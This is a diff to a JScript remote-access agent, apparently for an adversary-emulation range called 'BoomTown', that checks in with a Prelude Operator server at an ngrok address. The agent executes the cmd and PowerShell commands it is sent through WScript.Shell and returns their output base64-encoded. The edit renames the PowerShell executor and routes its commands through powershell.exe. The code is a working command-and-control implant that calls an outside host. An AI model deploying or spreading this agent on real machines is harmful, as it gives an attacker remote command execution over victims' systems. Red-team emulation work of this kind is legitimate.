@@ -16,7 +16,7 @@ WScript.Echo(myGuid);
 WScript.StdIn.ReadLine();
 
 */
-var myGuid = "4D44BF0-C0D0-4D21-9694-8C8BB885B6E3";
+var myGuid = "4D44BF0-C0D0-4D21-9694-8C8BB885B6E4";
 
 //TODO: Add Range variable, etc...
 
@@ -25,7 +25,7 @@ var myGuid = "4D44BF0-C0D0-4D21-9694-8C8BB885B6E3";
 // We'll base64 endode /decode stdout to stay sane. :)
 
 var prelude_operator_server = 'https://boomtown.ngrok.io';
-var JSONCheckin =  '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[]}'
+var JSONCheckin =  '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[]}'
 
 function sleep_for(count)  // TODO Align with JSON Sleep:
 {
@@ -111,14 +111,14 @@ function parse_Execute(task)
 			var r = new ActiveXObject("WScript.Shell").Exec(c);
 			while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
 			so_b64 = Base64.encode(so); //base64 encode stdout.
-			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
+			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
 			break;
 			
-		case "psh":
-			var r = new ActiveXObject("WScript.Shell").Exec(c);
+		case "pwsh":
+			var r = new ActiveXObject("WScript.Shell").Exec("powershell.exe " + c);
 			while(!r.StdOut.AtEndOfStream){so=r.StdOut.ReadAll()}
 			so_b64 = Base64.encode(so); //base64 encode stdout.
-			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["psh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"cmd","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
+			JSONResponse = '{"Name":"'+myGuid+'","Target":"","Hostname":"APTz","Location":"","Platform":"windows","Executors":["pwsh","cmd"],"Range":"BoomTown","Pwd":"","Sleep":10,"Executing":"","Links":[{"ID":"'+id_task+'","Executor":"pwsh","Payload":"","Request":"'+c+'","Response":"'+so_b64+'","Status":"0","operation": "'+operation+'","Pid":"'+r.ProcessID+'"}]}';
 			break;
 		
 			
@@ -146,10 +146,9 @@ while(true)
 			
 			parse_Execute(checkin_Response);
 			sleep_for(10);
-			
-			
+	
 		}
-		continue;
+		
 
 }
 
